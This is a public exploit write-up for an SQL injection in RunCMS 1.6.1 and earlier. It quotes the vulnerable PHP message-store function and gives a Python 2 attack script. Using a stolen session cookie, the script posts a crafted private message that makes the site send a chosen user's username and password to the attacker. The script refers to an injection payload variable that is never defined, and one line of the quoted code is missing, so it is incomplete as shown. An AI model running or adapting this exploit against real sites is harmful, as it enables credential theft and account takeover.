RunCMS <= 1.6.1 (msg_image) SQL Injection Exploit
=================================================



#!/usr/bin/python
"""
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This is a public Exploit                                    #
#=================================================================================================#
#  	           		           Runcms <= 1.6.1                                        #
#                                    Sql Injection Vulnerability                                  #
#=================================================================================================#
#                                .-= In memory of our friend rGod =-.                        	  #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
# magic_quotes_gpc = 0                           #  Vendor:   runcms.org	                  #
#                                                #  Author:   The:Paradox                         #
#================================================#  Severity: Moderately Critical                 #
#                                                #                                                #
# Uff... I have to find something to put here... #  Proud To Be Italian.                          #
#                                                #                                                #
#====================================#===========#================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
#												  #
# This time i&#039;m really too lazy to write a long PoC.						  #
# $msg_image (but also $msg_attachment) is unproperly checked when calling store()	          #
# function (modules/messages/class/pm.class.php) 						  #
# Sql injection in insert syntax (whatever I am not using blind attack). Prefix knowledge needed. #
#												  #
#=================================================================================================#

[modules/messages/class/pm.class.php]


64. 	function store() {
65.	global $db, $upload;
66.
67.	if ( !$this->isCleaned() ) {
68.		if ( !$this->cleanVars() ) {
69.			return false;
70.		}
71.	}
72.	
73.	foreach ( $this->cleanVars as $k=>$v ) {
74.		$$k = $v;
75.	}
76.	
77.	if ( empty($msg_id) ) {
78.	
80.		
81.		$sql = "
83.			msg_id=".intval($msg_id).",
84.			msg_image=&#039;$msg_image&#039;,
85.			msg_attachment=&#039;$msg_attachment&#039;,
86.			subject=&#039;$subject&#039;,
87.			from_userid=".intval($from_userid).",
88.			to_userid=".intval($to_userid).",
89.			msg_time=".time().",
90.			msg_text=&#039;$msg_text&#039;,
91.			read_msg=0,
92.			type=&#039;".$type."&#039;,
93.			allow_html=".intval($allow_html).",
94.			allow_smileys=".intval($allow_smileys).",
95.			allow_bbcode=".intval($allow_bbcode).",
96.			msg_replay=".intval($msg_replay)."";
97.	}
98.
99.	if ( !$result = $db->query($sql) ) {
100.		$this->errors[] = _NOTUPDATED;
101.		return false;
102.	}
103.
104.	return true;
105.	}
												  
#=================================================================================================#
# There are other vulnerabilities in this CMS. Find them by yourself. 		                  #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
"""

import urllib, urllib2
from sys import argv, exit


main = """
#================================================================#
#  	                  Runcms <= 1.6.1                        #
#                   Sql Injection Vulnerability                  #
#                     Discovered By The:Paradox                  #
#                                                                #
#                 rGod is still alive in our hearts              #
#                                                                #
# Usage:                                                         #
#  ./homerun [Target+path] [TargetUid] [ValidUserCookie]         #
#  ./homerun --help (to print an example)                        #
#================================================================#
"""


if len(argv)>=2 and argv[1] == "--help": 
	print "\nuser@linux:~/Desktop$ ./homerun http://localhost/web/runcms/ 1 rc_sess=a%3A3%3A%7Bi%3A0%3Bi%3A3%3Bi%3A1%3Bs%3A40%3A%228b394462d67198707aea362098001610d35687ff%22%3Bi%3A2%3Bi%3A1212933002%3B%7D;\n\n" + main + "\n\n[.] Exploit Starting.\n[+] Sending HTTP Request...\n[+] A message with username and password of user with id 1 has been sent to user with id 3.\n -= The:Paradox =-"
else: print main


if len(argv)<=3:	exit()
else:   print "[.] Exploit Starting."


host = argv[1]
tuid = argv[2]
cookie = argv[3]
try: uid = cookie.split("a%3A3%3A%7Bi%3A0%3Bi%3A")[1].split("%3Bi%3A1%3Bs%3A40%3A%")[0]
except: exit("[-] Invalid cookie")


print "[+] Sending HTTP Request..."
values = {&#039;subject&#039; : &#039;Master attack failed.&#039;,
	  &#039;message&#039; : &#039;Probably mq = 1 or system patched.&#039;,
	  &#039;allow_html&#039; : 0,
	  &#039;allow_smileys&#039; : 1,
	  &#039;allow_bbcode&#039; : 0,
	  &#039;msg_replay&#039; : 1,
          &#039;submit&#039; : &#039;1&#039;,
	  &#039;msg_image&#039; : sql,
          &#039;to_userid&#039; : uid }
headers = {&#039;Cookie&#039; : cookie, 
	   &#039;Content-Type&#039; : &#039;application/x-www-form-urlencoded&#039;}
req = urllib2.Request(host + "/modules/messages/pmlite.php", urllib.urlencode(values), headers)
response = urllib2.urlopen(req)


if response.read().find(&#039;Your message has been posted.&#039;) != -1: print "[+] A message with username and password of user with id " + tuid + " has been sent to user with id " + uid + ".\n -= The:Paradox =-"
else: print "[-] Unable to send message"



